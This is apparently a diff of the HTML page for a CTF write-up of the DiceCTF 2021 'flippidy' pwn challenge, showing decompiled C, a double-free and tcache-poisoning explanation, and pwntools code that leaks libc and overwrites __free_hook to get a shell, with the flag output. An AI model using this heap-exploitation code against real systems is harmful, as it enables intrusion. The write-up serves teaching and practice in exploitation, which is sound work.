 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">sub_401378</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">void</span> **v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+Ah] [rbp-A6h]</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Bh] [rbp-A5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [rsp+50h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+98h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= firstRead_404150 / <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dest, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)qword_404158 + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;s, *((<span class="keyword">const</span> <span class="keyword">char</span> **)qword_404158 + i));</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="keyword">void</span> **)qword_404158 + i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)qword_404158 + firstRead_404150 - i - <span class="number">1</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;dest, *((<span class="keyword">const</span> <span class="keyword">char</span> **)qword_404158 + firstRead_404150 - i - <span class="number">1</span>));</span><br><span class="line">      <span class="built_in">free</span>(*((<span class="keyword">void</span> **)qword_404158 + firstRead_404150 - i - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_QWORD *)qword_404158 + i) = <span class="number">0L</span>L;</span><br><span class="line">    *((_QWORD *)qword_404158 + firstRead_404150 - i - <span class="number">1</span>) = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = (<span class="keyword">void</span> **)((<span class="keyword">char</span> *)qword_404158 + <span class="number">8</span> * (firstRead_404150 - i) - <span class="number">8</span>);</span><br><span class="line">      *v0 = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">      <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)qword_404158 + firstRead_404150 - i - <span class="number">1</span>), &amp;s);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)qword_404158 + firstRead_404150 - i - <span class="number">1</span>) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = (<span class="keyword">void</span> **)((<span class="keyword">char</span> *)qword_404158 + <span class="number">8</span> * i);</span><br><span class="line">      *v1 = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">      <span class="built_in">strcpy</span>(*((<span class="keyword">char</span> **)qword_404158 + i), &amp;dest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_QWORD *)qword_404158 + i) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="Getting-a-leak"><a href="#Getting-a-leak" class="headerlink" title="Getting a leak"></a>Getting a leak</h3><p>To get a leak we first need to find a way to get an <strong>arbitrary write</strong>, we know that the pointers to the strings of the menu are present at a global variable at <code>0x404020</code> if we can manage to change this pointer to a <strong>GOT address</strong> we can <strong>leak</strong> a libc address.</p>
+<h3 id="getting-a-leak"><a class="markdownIt-Anchor" href="#getting-a-leak"></a> Getting a leak</h3>
+<p>To get a leak we first need to find a way to get an <strong>arbitrary write</strong>, we know that the pointers to the strings of the menu are present at a global variable at <code>0x404020</code> if we can manage to change this pointer to a <strong>GOT address</strong> we can <strong>leak</strong> a libc address.</p>
 <p>What happens if we run the flip function when the size of the notebook only has <strong>1</strong> note ?</p>
 <p>The <strong>1st</strong> note will be also the <strong>last</strong> note! because of this we will have a double free! and at the same time we will <strong>corrupt</strong> the next pointer of the <strong>tcachebin[0x40]</strong> list to the value we want!</p>
-<p>Visually this is what happens:<br><a data-fancybox="gallery" href="https://i.imgur.com/gEkVcNY.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/gEkVcNY.png" alt><br></a><br>Source code to achieve this:</p>
+<p>Visually this is what happens:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/gEkVcNY.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/gEkVcNY.png" alt><br>
+</a><br>
+Source code to achieve this:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Index: '</span>, str(index))</span><br><span class="line">    r.sendlineafter(<span class="string">'Content: '</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flip</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">': '</span>, <span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">r = getConn()</span><br><span class="line">r.sendlineafter(<span class="string">'To get started, first tell us how big your notebook will be: '</span>, str(<span class="number">1</span>))</span><br><span class="line">add(<span class="number">0</span>, p64(<span class="number">0x404020</span>))</span><br><span class="line">flip() <span class="comment"># Triggers double free</span></span><br></pre></td></tr></table></figure>
 <p>Next malloc will overwrite data in <strong>0x402020</strong> which contains the pointers of the <strong>MENU</strong>, if we change them to a GOT address we will leak libc in the next menu print of the loop.</p>
 <p>The tcache bin list is looking like this right now:</p>
@@ -433,20 +434,31 @@
 <p>We have enough bytes to overwrite the 3rd item of the list at <strong>0x404040</strong> we can easily poison this tcache bin by changing it to <strong>0x404158</strong>.</p>
 <p><strong>0x404158</strong> address is important because it contains the pointer of the first note of the notebook, if we control this value we will be able to write anywhere.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x0000000000404020 -&gt; 0x0000000000404040 -&gt; 0x654d202d2d2d2d2d</span></span><br><span class="line">add(<span class="number">0</span>,p64(elf.got[<span class="string">'fgets'</span>])*<span class="number">4</span>+p64(<span class="number">0x404158</span>))</span><br><span class="line">FGETS = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">LIBC = FGETS-libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">ONE_SHOT = LIBC+<span class="number">0x4f322</span></span><br><span class="line">log.info(<span class="string">"FGETS 0x%x"</span> % FGETS)</span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBC)</span><br></pre></td></tr></table></figure>
-<h3 id="Getting-a-shell"><a href="#Getting-a-shell" class="headerlink" title="Getting a shell"></a>Getting a shell</h3><p>Now that we have libc we just need to overwrite <strong>malloc_hook</strong> or <strong>free_hook</strong> to one_gadget to get a shell.</p>
-<p>After our last malloc the tcachebin is looking like this:<br><strong>0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; …</strong></p>
+<h3 id="getting-a-shell"><a class="markdownIt-Anchor" href="#getting-a-shell"></a> Getting a shell</h3>
+<p>Now that we have libc we just need to overwrite <strong>malloc_hook</strong> or <strong>free_hook</strong> to one_gadget to get a shell.</p>
+<p>After our last malloc the tcachebin is looking like this:<br>
+<strong>0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; …</strong></p>
 <ul>
-<li><p>1st malloc and setting <strong>0xdeadbeef</strong> as input, the list will look like this:<br><strong>0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeef</strong></p>
+<li>
+<p>1st malloc and setting <strong>0xdeadbeef</strong> as input, the list will look like this:<br>
+<strong>0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeef</strong></p>
 </li>
-<li><p>2nd malloc and setting p64(LIBC+libc.symbols[‘__free_hook’]) as input:<br><strong>0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0</strong></p>
+<li>
+<p>2nd malloc and setting p64(LIBC+libc.symbols[’__free_hook’]) as input:<br>
+<strong>0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0</strong></p>
 </li>
-<li><p>3rd malloc and setting <strong>0xdeadbeef</strong> as input:<br><strong>0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeef</strong></p>
+<li>
+<p>3rd malloc and setting <strong>0xdeadbeef</strong> as input:<br>
+<strong>0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeef</strong></p>
 </li>
-<li><p>4th malloc and setting p64(LIBC+libc.symbols[‘__free_hook’]) as input:<br><strong>FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; …</strong></p>
+<li>
+<p>4th malloc and setting p64(LIBC+libc.symbols[’__free_hook’]) as input:<br>
+<strong>FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; …</strong></p>
 </li>
 </ul>
 <p>Next malloc will write into <strong>FREE_HOOK</strong>, with that we can easily fill it with <strong>one_gadget</strong> address.</p>
-<p>The python code:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; ...</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeef</span></span><br><span class="line">add(<span class="number">0</span>,p64(LIBC+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="comment"># 0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeef</span></span><br><span class="line">add(<span class="number">0</span>,p64(LIBC+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="comment"># FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; ...</span></span><br><span class="line">add(<span class="number">0</span>,p64(ONE_SHOT)) <span class="comment"># Sets FREE_HOOK to ONE_SHOT</span></span><br></pre></td></tr></table></figure></p>
+<p>The python code:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 0x0000000000404040 -&gt; 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x404020 -&gt; ...</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># 0x0000000000404158 -&gt; 0x0000000000b65260 -&gt; 0x0000000000404040 -&gt; 0x00000000deadbeef</span></span><br><span class="line">add(<span class="number">0</span>,p64(LIBC+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="comment"># 0x0000000000b65260 -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0</span></span><br><span class="line">add(<span class="number">0</span>,p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"><span class="comment"># 0x0000000000404158 -&gt; FREE_HOOK -&gt; 0x0000000000b65260 -&gt; 0xdeadbeef</span></span><br><span class="line">add(<span class="number">0</span>,p64(LIBC+libc.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line"><span class="comment"># FREE_HOOK -&gt; 0x0000000000404158 -&gt; FREE_HOOK -&gt; ...</span></span><br><span class="line">add(<span class="number">0</span>,p64(ONE_SHOT)) <span class="comment"># Sets FREE_HOOK to ONE_SHOT</span></span><br></pre></td></tr></table></figure>
 <p>Triggering free to get a shell:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flip() <span class="comment"># Triggers free_hook and gets ourselves a shell</span></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure>
 <p>The entire script:</p>
@@ -455,18 +467,18 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ python flippidy.py REMOTE</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/flippidy/flippidy'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/flippidy/libc-2.27.so'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to dicec.tf on port 31904: Done</span><br><span class="line">[*] FGETS 0x7fb4d2848b20</span><br><span class="line">[*] LIBC 0x7fb4d27ca000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">challenge</span><br><span class="line">flag.txt</span><br><span class="line">$ cat flag.txt</span><br><span class="line">dice&#123;some_dance_to_remember_some_dance_to_forget_2.27_checks_aff239e1a52cf55cd85c9c16&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
       
     </div>
-    <footer class="article-footer">
-      <blockquote>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
   <ul class="post-copyright list-unstyled">
     
-    <li class="post-copyright-link">
-      <strong>Link to this article：</strong>
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
       <a href="https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/" title="[Pwn] DiceCTF2021 - flippidy" target="_blank" rel="external">https://teamrocketist.github.io/2021/02/08/Pwn-DiceCTF2021-flippidy/</a>
     </li>
     
-    <!--li class="post-copyright-license">
+    <li class="post-copyright-license">
       <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
-    </li-->
+    </li>
   </ul>
 </blockquote>
 
@@ -488,93 +500,79 @@
 </div>
 
 
-    </footer>
+    </div>
   </article>
   
     
-  <div id="comments"></div>
+  <section id="comments">
+  	
+  </section>
 
-<!-- LiveRe City install code -->
-<!--<div id="comments">
-<div id="lv-container" data-id="city" data-uid="MTAyMC8zMDExMy82NjY4">
-	<script type="text/javascript">
-   (function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> Please activate JavaScript for write a comment in LiveRe</noscript>
-</div>
-</div>-->
-<!-- completed City install code -->
-<div id="disqus_thread"></div>
-<script>
-
-/**
-*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
-*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
-/*
-var disqus_config = function () {
-this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
-this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
-};
-*/
-(function() { // DON'T EDIT BELOW THIS LINE
-var d = document, s = d.createElement('script');
-s.src = 'https://teamrocketist.disqus.com/embed.js';
-s.setAttribute('data-timestamp', +new Date());
-(d.head || d.body).appendChild(s);
-})();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 
   
 </div>
 
   <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
   
   <ul class="pager pull-left">
     
     <li class="prev">
-      <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" title="[Pwn] WMCTF2022 - WM Baby Droid"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
+      <a href="/2022/08/23/Pwn-WMCTF2022-WM-Baby-Droid/" title="[Pwn] WMCTF2022 - WM Baby Droid"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
     </li>
     
     
     <li class="next">
-      <a href="/2020/04/20/Misc-PCTF2020-golf-so/" title="[Misc] PCTF2020 - golf.so">Older&nbsp;&nbsp;<i class="fa fa-angle-right" aria-hidden="true"></i></a>
+      <a href="/2020/04/20/Misc-PCTF2020-golf-so/" title="[Misc] PCTF2020 - golf.so"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
     </li>
+    
     
   </ul>
   
   
   
   <div class="bar-right">
+    
     <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
+    
   </div>
-  
+  </div>
 </nav>
+  
 
-</section>
 
-  <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        &copy; 2022 TEAMROCKETIST
+        
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
 <script>
 window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 </script>
-
-<script src="/js/jquery.fancybox.min.js"></script>
-<script src="/js/plugin.js"></script>
+<script src="/js/plugin.min.js"></script>
 <script src="/js/application.js"></script>
 
-
-
-  <script>
+    <script>
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
@@ -595,9 +593,48 @@ window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
 
 
 
-<!-- Google Analytics -->
-<script type="text/javascript">
-(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+
+   
+
+
+
+
+   
+
+
+  <script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.3.5/dist/jquery.fancybox.min.js"></script>
+  <script>
+  //利用 FancyBox 实现点击图片放大
+  $(document).ready(function() {
+    $('article img').not('[hidden]').not('.panel-body img').each(function() {
+      var $image = $(this);
+      var imageCaption = $image.attr('alt');
+      var $imageWrapLink = $image.parent('a');
+      if ($imageWrapLink.length < 1) {
+        var src = this.getAttribute('src');
+        var idx = src.lastIndexOf('?');
+        if (idx != -1) {
+          src = src.substring(0, idx);
+        }
+        $imageWrapLink = $image.wrap('<a href="' + src + '"></a>').parent('a');
+      }
+      $imageWrapLink.attr('data-fancybox', 'images');
+      if (imageCaption) {
+        $imageWrapLink.attr('data-caption', imageCaption);
+      }
+    });
+    $().fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+    });
+  });
+  </script>
+
+
+
+    <script defer type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
 (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
 m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
 })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
@@ -606,7 +643,6 @@ ga('create', 'UA-104385070-1', 'auto');
 ga('send', 'pageview');
 
 </script>
-<!-- End Google Analytics -->
 
 
 
